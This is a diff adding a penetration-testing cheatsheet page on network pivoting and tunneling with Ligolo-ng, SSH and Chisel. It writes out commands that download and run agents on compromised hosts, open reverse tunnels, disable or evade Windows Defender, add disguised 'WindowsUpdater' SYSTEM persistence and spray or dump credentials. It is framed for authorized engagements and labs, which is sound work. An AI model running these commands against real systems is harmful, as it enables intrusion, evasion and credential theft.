@@ -1,0 +1,471 @@
+---
+title: Pivoting & Tunneling
+description: Reach unreachable subnets through compromised hosts — Ligolo-ng first, with SSH and Chisel as fallbacks.
+openGraph:
+  title: "Pivoting & Tunneling"
+  description: "Reach unreachable subnets through compromised hosts — Ligolo-ng first, with SSH and Chisel as fallbacks."
+  images:
+    - url: /imgs/pivoting.jpg
+      width: 1672
+      height: 941
+      alt: Pivoting & Tunneling
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "Pivoting & Tunneling"
+  description: "Reach unreachable subnets through compromised hosts — Ligolo-ng first, with SSH and Chisel as fallbacks."
+  images:
+    - url: /imgs/pivoting.jpg
+      width: 1672
+      height: 941
+      alt: Pivoting & Tunneling
+      type: image/jpeg
+---
+
+import { Callout } from 'nextra/components'
+
+# Pivoting & Tunneling
+
+| Component | Runs on | Purpose |
+|-----------|---------|---------|
+| `proxy` | Attacker | Manages TUN interface, routes, sessions |
+| `agent` | Pivot host | Connects back over TLS, forwards traffic |
+
+## Cheatsheet
+
+### Ligolo-ng (primary)
+
+```bash
+# Download latest proxy + agents from https://github.com/nicocha30/ligolo-ng/releases
+
+# Attack box: create TUN (once per session)
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+# Ligolo-ng >= 0.6 (from the proxy shell):
+# ligolo-ng » interface_create --name ligolo
+
+# Attack box: start proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
+# Prefer fingerprint in real engagements (print from proxy shell):
+# ligolo-ng » certificate_fingerprint
+
+# Pivot: connect agent back to attack box
+./agent -connect <LHOST>:11601 -ignore-cert
+nohup ./agent -connect <LHOST>:11601 -ignore-cert >/dev/null 2>&1 &   # survives logout
+# ./agent -connect <LHOST>:11601 -accept-fingerprint <FINGERPRINT>
+
+# In ligolo-ng shell after agent joins
+# session
+#autoroute (autorouting)
+# ifconfig
+# tunnel_start --tun ligolo          
+# autoroute
+# interface_add_route --name ligolo --route <SUBNET>/24   # >= 0.6
+
+# Attack box route (if not using interface_add_route / autoroute)
+sudo ip route add <SUBNET>/24 dev ligolo
+
+# Native tools through the TUN no proxychains
+nmap -sT -Pn -p 22,80,135,139,445,3389 <SUBNET>/24
+nxc smb <SUBNET>/24 -u <USER> -p <PASS>
+evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASS>'
+
+# Double pivot: listener on hop1 relays second agent to your proxy
+# [Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+# On pivot2: agent -connect <PIVOT1_IP>:11601 -ignore-cert
+
+# Catch reverse shells that can only reach the pivot
+# [Agent : pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+# listener_list / listener_del --id <ID>   # older: listener_stop <ID>
+
+# Cleanup on attack box
+sudo ip route del <SUBNET>/24 dev ligolo
+sudo ip link set ligolo down
+sudo ip tuntap del mode tun ligolo
+```
+
+```powershell
+# Windows pivot — run agent (hidden)
+Start-Process -WindowStyle Hidden -FilePath "C:\Users\Public\agent.exe" `
+  -ArgumentList "-connect <LHOST>:11601 -ignore-cert"
+```
+
+### Fallback: SSH dynamic / local / remote forward
+
+```bash
+# Dynamic SOCKS then proxychains
+ssh -D 9050 <USER>@<TARGET_IP>
+# /etc/proxychains.conf -> socks5 127.0.0.1 9050
+proxychains nmap -sT -Pn -p445,3389 <INTERNAL_IP>
+
+# Local forward: bring pivot's localhost service to attack box
+ssh -L 1234:localhost:3306 <USER>@<TARGET_IP>
+
+# Remote forward: catch reverse shell from internal host via pivot
+ssh -R 8080:localhost:<LPORT> <USER>@<TARGET_IP>
+# Payload LHOST = pivot internal IP, LPORT = 8080
+
+# Multi-hop when you already have keys
+sshuttle -r <USER>@<TARGET_IP> <SUBNET>/24
+```
+
+### Fallback: Chisel SOCKS
+
+```bash
+# Attack box listens (egress from pivot often easier)
+./chisel server --reverse -p 1234 --socks5
+
+# Pivot connects reverse SOCKS
+./chisel client <LHOST>:1234 R:socks
+# proxychains.conf -> socks5 127.0.0.1 1080
+```
+
+## Methodology
+
+### Phase 0: Orientation — is this a pivot?
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+  - How many NICs does this foothold have, and which subnets are attached?
+  - What does the routing table say I can reach that my attack box cannot?
+  - Can this host egress to `<LHOST>` on a usable port (11601, 443, 80, 22)?
+  - Do I have enough privilege to drop a binary and keep a process alive?
+  - Is Ligolo-ng viable, or am I constrained to SSH-only / no-binary?
+  - What evidence do I need before adding routes (subnet, gateway, dual-home proof)?
+</Callout>
+
+```bash
+# Linux foothold who / where / reachability
+id; hostname; cat /etc/os-release
+ip -br a; ip route; cat /etc/resolv.conf
+ss -tulnp 2>/dev/null || netstat -tulnp
+
+# Windows foothold
+# whoami /all
+# ipconfig /all
+# route print
+# netstat -ano
+```
+
+- [ ] Confirm identity and privilege on the foothold (`id` / `whoami /all`).
+- [ ] Inventory NICs and note every non-loopback subnet (`ip a` / `ipconfig /all`).
+- [ ] Read the routing table document reachable internal ranges.
+- [ ] Test egress from pivot → `<LHOST>` (common ports: 443, 80, 11601, 22).
+- [ ] Choose path: **Ligolo-ng** (binary + egress) → Phase 1; **SSH only** → Phase 5; **no binary / weird egress** → Chisel or SSH remote forward.
+- [ ] Sketch the topology (attack box → pivot → internal) before tunneling.
+
+### Phase 1: Stand up Ligolo-ng proxy
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Do I have matching proxy/agent binaries for the pivot OS/arch (Linux/Windows, AMD64/ARM)?
+  - Is the proxy listening on an interface/port the pivot can reach?
+  - Am I using `-selfcert` (labs) or a real cert / fingerprint (engagements)?
+  - Does the TUN interface exist before I expect traffic to flow?
+  - Will another process collide on 11601?
+  - What file transfer method will deliver the agent to the pivot?
+</Callout>
+
+```bash
+# Proxy on attack box
+./proxy -selfcert -laddr 0.0.0.0:11601
+# Print fingerprint for agent pinning (engagements)
+# ligolo-ng » certificate_fingerprint
+
+# TUN pick one approach
+sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
+# OR (>= 0.6 inside proxy shell): interface_create --name ligolo
+
+ip addr show ligolo   # present, no IP yet
+# OR
+# ligolo-ng » autoroute
+```
+
+- [ ] Download matching proxy/agent builds for the pivot OS/arch.
+- [ ] Create and bring up the `ligolo` TUN interface; verify with `ip addr show ligolo`.
+- [ ] Start `./proxy -selfcert -laddr 0.0.0.0:11601` (or `-certfile` / `-keyfile` in production-like labs).
+- [ ] Record the TLS fingerprint if not using `-ignore-cert` on the agent.
+- [ ] Leave the `ligolo-ng »` shell open session management happens here.
+- [ ] If bind fails (`address already in use`), kill the old proxy or change `-laddr`.
+
+### Phase 2: Deploy agent and open the tunnel
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which transfer method matches this foothold and OPSEC budget?
+  - On Windows, will Defender flag the stock binary? Do I need garble / exclusion / C2 load?
+  - Did the agent actually join (`Agent joined`) or die silently (AV, path, egress)?
+  - Should the agent run in the foreground (debug) or background (survives logout)?
+  - Which interface on the agent is the **internal** path I care about?
+  - Have I added the route **before** expecting tools to work?
+  - Am I using `-sT -Pn` for nmap through the TUN (SYN scans break)?
+</Callout>
+
+```bash
+# Serve agent from attack box
+cd ~/tools/ligolo && python3 -m http.server 8000
+
+# Linux pivot
+wget http://<LHOST>:8000/agent -O /tmp/agent && chmod +x /tmp/agent
+nohup /tmp/agent -connect <LHOST>:11601 -ignore-cert >/dev/null 2>&1 &
+```
+
+```powershell
+# Windows pivot Defender often flags stock agent.exe
+iwr http://<LHOST>:8000/agent.exe -OutFile C:\Users\Public\agent.exe
+# Older Windows:
+# certutil -urlcache -f http://<LHOST>:8000/agent.exe C:\Users\Public\agent.exe
+
+C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert
+# Hidden (no console):
+# Start-Process -WindowStyle Hidden -FilePath "C:\Users\Public\agent.exe" `
+#   -ArgumentList "-connect <LHOST>:11601 -ignore-cert"
+```
+
+```text
+# ligolo-ng shell workflow
+ligolo-ng » session
+[Agent] » ifconfig
+[Agent] » tunnel_start --tun ligolo    # older builds: start
+# route (>= 0.6):
+ligolo-ng » interface_add_route --name ligolo --route <SUBNET>/24
+# or manual:
+# sudo ip route add <SUBNET>/24 dev ligolo
+```
+
+- [ ] Transfer the correct agent binary to the pivot ([file transfers](/04-Post-Exploitation/Transfer-Files)).
+- [ ] On Windows: assess Defender exclusion / rebuild with garble / C2 load (RoE-dependent).
+- [ ] Start the agent pointing at `<LHOST>:11601`; confirm `Agent joined` in the proxy.
+- [ ] Prefer background (`nohup` / hidden `Start-Process`) so the agent survives logout.
+- [ ] Select the session → `ifconfig` → identify the internal subnet(s).
+- [ ] Add route(s) for each internal subnet via the `ligolo` interface.
+- [ ] `tunnel_start --tun ligolo` (or `start` on older builds).
+- [ ] Validate with a single host check (`nmap -sT -Pn -p <PORT> <INTERNAL_IP>`), then widen.
+
+<Callout type="warning">
+  Ligolo-ng's TUN does **not** support `-sS` (SYN scan). Always use `-sT` (full TCP connect) and `-Pn` (skip ICMP) with nmap through the tunnel.
+</Callout>
+
+### Phase 3: Enumerate and operate through the pivot
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which hosts on the new subnet respond, and which services matter for the objective?
+  - Can I reuse credentials already harvested against these hosts?
+  - Does DNS resolve internal names, or must I use IPs / `--dns-servers`?
+  - Which findings create a **second hop** (another dual-homed host)?
+  - Am I logging every route, listener, and command for the report?
+</Callout>
+
+```bash
+# Host/service discovery through TUN
+nmap -sT -Pn -p 22,80,88,135,139,445,389,636,3389,5985 <SUBNET>/24
+
+# Cred reuse / AD surface
+nxc smb <SUBNET>/24 -u <USER> -p <PASS> --shares
+nxc winrm <INTERNAL_IP> -u <USER> -p <PASS>
+evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASS>'
+impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<INTERNAL_IP>'
+```
+
+- [ ] Map live hosts and high-value ports on the newly reachable subnet.
+- [ ] Spray/reuse known creds before brute force; record every valid auth for later hosts.
+- [ ] Prefer IPs if internal DNS fails; else `nmap --dns-servers <INTERNAL_DNS>`.
+- [ ] Treat every new dual-homed host as a candidate for Phase 4.
+- [ ] Capture screenshots/output of tunnel up + first successful internal connect for reporting.
+
+### Phase 4: Double pivot and reverse listeners
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Can hop1 reach hop2, and can hop2 reach the deeper subnet I need?
+  - Must hop2's agent connect to hop1's listener (not directly to Kali)?
+  - Do I need a listener for **second agents**, for **reverse shells**, or both?
+  - Is there a simpler path (cred reuse, RDP, WinRM) that avoids a double pivot?
+  - Have I added the *new* route after the second session is live?
+</Callout>
+
+```text
+# Hop1 already tunneled. Relay proxy port through hop1:
+[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+# Hop2 agent points at pivot1, not Kali
+# ./agent -connect <PIVOT1_IP>:11601 -ignore-cert
+
+# Switch session → ifconfig → route deep subnet → tunnel_start
+# listener_list / listener_del --id <ID>
+
+# Reverse shell catch: internal host → pivot:4444 → Kali:4444
+# [Agent : pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+```
+
+- [ ] Confirm hop1 can TCP-connect to hop2 on the agent port you choose.
+- [ ] `listener_add` on hop1 forwarding to local proxy port `11601`.
+- [ ] Transfer agent to hop2 through the already-established tunnel, then run it targeting `<PIVOT1_IP>:<LISTEN_PORT>`.
+- [ ] Select the new session, add the deep subnet route, start that tunnel.
+- [ ] For reverse shells from hosts that only see the pivot, add a listener to `<LPORT>` on Kali.
+- [ ] Clean dead listeners (`listener_list` → `listener_del`) to avoid port confusion.
+
+### Phase 5: Fallbacks when Ligolo-ng is not an option
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is SSH available with a usable account, making dynamic/local/remote forwards enough?
+  - Does egress allow an HTTP-based Chisel reverse SOCKS when inbound to the pivot is blocked?
+  - Am I stuck with proxychains (`-sT` only) and accepting the speed/noise trade-off?
+  - Which single service do I actually need full subnet route, or one `-L`/`-R` forward?
+</Callout>
+
+```bash
+# SSH dynamic SOCKS
+ssh -D 9050 <USER>@<TARGET_IP>
+proxychains nmap -sT -Pn -p445 <INTERNAL_IP>
+
+# SSH local forward (one service)
+ssh -L 1234:localhost:3306 <USER>@<TARGET_IP>
+
+# SSH remote forward (callback via pivot)
+ssh -R 8080:localhost:<LPORT> <USER>@<TARGET_IP>
+
+# Chisel reverse SOCKS (pivot egress to you)
+./chisel server --reverse -p 1234 --socks5          # on <LHOST>
+./chisel client <LHOST>:1234 R:socks                # on pivot
+# proxychains.conf: socks5 127.0.0.1 1080
+```
+
+- [ ] Prefer the **smallest** forward that achieves the objective (single `-L` beats full SOCKS when you only need MySQL).
+- [ ] For subnet-wide access without Ligolo, use SSH `-D` or Chisel `R:socks` + proxychains.
+- [ ] Remember proxychains requires full connect scans (`nmap -sT -Pn`) — no half-open SYN.
+- [ ] If SSH and binary drops both fail, reassess foothold quality (web shell limits, AppLocker, no egress).
+
+### Phase 6: Cleanup
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Have I removed all agent binaries from compromised hosts?
+  - Are all routes and TUN interfaces cleaned up on my attacker box?
+  - Did I kill background agent processes on every pivot?
+  - Have I documented the subnets, sessions, and routes used for the report?
+</Callout>
+
+```bash
+# On Kali remove routes and TUN
+sudo ip route del <SUBNET>/24 dev ligolo
+sudo ip link set ligolo down
+sudo ip tuntap del mode tun ligolo
+```
+
+- [ ] Kill agent processes on all pivot hosts.
+- [ ] Remove agent binaries from all pivot hosts.
+- [ ] Delete routes on the attacker box; tear down the TUN interface.
+- [ ] Remove any scheduled tasks or persistence created for the agent.
+- [ ] Document the pivot chain, subnets reached, and evidence gathered for reporting.
+
+## How It Works
+
+**Pivoting** crosses a network boundary through a host that already sits on both sides (dual-homed jump / beachhead). **Tunneling** wraps your tool traffic inside a carrier the pivot can already speak (TLS for Ligolo, SSH, HTTP for Chisel). **Lateral movement** is the follow-on: authenticating to the newly reachable hosts pivoting only creates the path.
+
+Ligolo-ng establishes a TLS tunnel between agent (pivot) and proxy (attacker). The proxy exposes a TUN device; when you route a subnet into that TUN, the kernel sends packets into it, the proxy encapsulates them over TLS, and the agent forwards them onto the internal network. Return traffic reverses the path. That is why Ligolo is usually faster and less friction than SOCKS-based tools every TCP/UDP app uses normal sockets with no wrapper.
+
+SSH `-D` builds a SOCKS listener on the attack box; applications must speak SOCKS (or be forced via proxychains). SSH `-L`/`-R` map individual ports. Chisel carries a SOCKS channel over HTTP-like framing useful when only outbound HTTP from the pivot is allowed.
+
+## Reference
+
+### Ligolo-ng decision matrix
+
+| Situation | Action |
+|-----------|--------|
+| Dual-homed Linux/Windows, binary OK, egress to you | Ligolo-ng TUN + route |
+| Need second hop behind first pivot | `listener_add` on hop1 → agent on hop2 |
+| Internal host can only reach pivot, not Kali | Listener on pivot → Kali `<LPORT>` |
+| SSH creds only, no binary drop | `ssh -D` / `-L` / `-R` / `sshuttle` |
+| Inbound to pivot blocked, outbound HTTP OK | Chisel `server --reverse` + `R:socks` |
+| One localhost service on pivot | `ssh -L` or Ligolo listener — not a full TUN |
+
+### Ligolo-ng vs alternatives
+
+| Tool | Mechanism | Proxychains | Speed | Multi-hop |
+|------|-----------|-------------|-------|-----------|
+| **Ligolo-ng** | TUN interface | No | Fast | Listeners |
+| Chisel | SOCKS / port-forward | Yes (SOCKS) | Moderate | Manual |
+| SSH dynamic (`-D`) | SOCKS proxy | Yes | Moderate | SSH chains |
+| Metasploit autoroute | Internal routing | Yes (SOCKS) | Slow | Pivot chains |
+
+Ligolo-ng is preferred for most engagements. Chisel remains the fallback when you cannot deploy a binary (constrained web shell, port-forward only).
+
+### Ligolo-ng troubleshooting
+
+| Problem | Likely cause | Fix |
+|---------|--------------|-----|
+| `Cannot find device "ligolo"` | TUN missing | `ip tuntap add` / `interface_create` |
+| Tunnel up, no traffic | Route missing | `ip route add <SUBNET> dev ligolo` or `interface_add_route` |
+| nmap all filtered | `-sS` through TUN | Use `-sT -Pn` |
+| Agent dies on logout | Foreground process | `nohup` / `tmux` / hidden `Start-Process` |
+| Defender kills `agent.exe` | Signature | Rebuild with garble; RoE for exclusions |
+| Slow throughput | MTU mismatch | Add `-mtu 1500` to agent |
+| `bind: address already in use` | Stale proxy | `pkill proxy` or change port |
+| DNS names fail | Resolver not pivoted | Use IPs or `--dns-servers <INTERNAL_DNS>` |
+
+### Windows agent AV / OPSEC
+
+Stock `agent.exe` is commonly flagged. Options in increasing OPSEC cost:
+
+| Method | Access required | Notes |
+|--------|-----------------|-------|
+| Lab/CTF — Defender off | None | N/A |
+| `Add-MpPreference -ExclusionPath` | Local admin | Logged; may alert SOC |
+| `Set-MpPreference -DisableRealtimeMonitoring $true` | Local admin | Highly visible last resort |
+| Build from source with `garble` | Build environment | Evades static signatures |
+| Reflective loader / C2 injection | Existing C2 | Best OPSEC |
+
+```bash
+# Custom Windows agent build (engagement OPSEC)
+git clone https://github.com/nicocha30/ligolo-ng
+cd ligolo-ng
+go install mvdan.cc/garble@latest
+GOOS=windows GOARCH=amd64 garble -literals -tiny build -o agent.exe ./cmd/agent
+```
+
+### Engagement persistence (Windows)
+
+Register the agent as a scheduled task only when RoE allows persistence:
+
+```cmd
+schtasks /create /tn "WindowsUpdater" /tr "C:\Users\Public\agent.exe -connect <LHOST>:11601 -ignore-cert" /sc onstart /ru SYSTEM /f
+```
+
+<Callout type="warning">
+  Only use persistence within scope and Rules of Engagement. Remove all persistence artifacts during cleanup.
+</Callout>
+
+### Nmap through Ligolo-ng
+
+```bash
+nmap -sT -Pn -p <PORTS> <TARGET_IP>
+# -sT  full TCP connect (required)
+# -Pn  skip host discovery (ICMP unreliable through TUN)
+# --dns-servers <INTERNAL_DNS_IP>   when you need internal name resolution
+```
+
+### SSH quick patterns
+
+| Goal | Command shape |
+|------|----------------|
+| Local service to Kali | `ssh -L <LPORT>:localhost:<RPORT> user@pivot` |
+| Dynamic SOCKS | `ssh -D 9050 user@pivot` |
+| Catch shell via pivot | `ssh -R <PIVOT_PORT>:localhost:<LPORT> user@pivot` |
+| Whole subnet (Linux pivot) | `sshuttle -r user@pivot <SUBNET>/24` |
+
+### Chisel reverse SOCKS (when Ligolo cannot land)
+
+Run the server on the attack box with `--reverse`. Pivot connects outbound. Point proxychains at `127.0.0.1:1080`. Same `-sT -Pn` constraint as SSH SOCKS.
+
+<div className="pensieve-hashtags">
+  #Penetration-Testing #Red-Team #Certification #Linux #Windows #Pivoting #Tunneling #Ligolo-ng #Lateral-Movement
+</div>
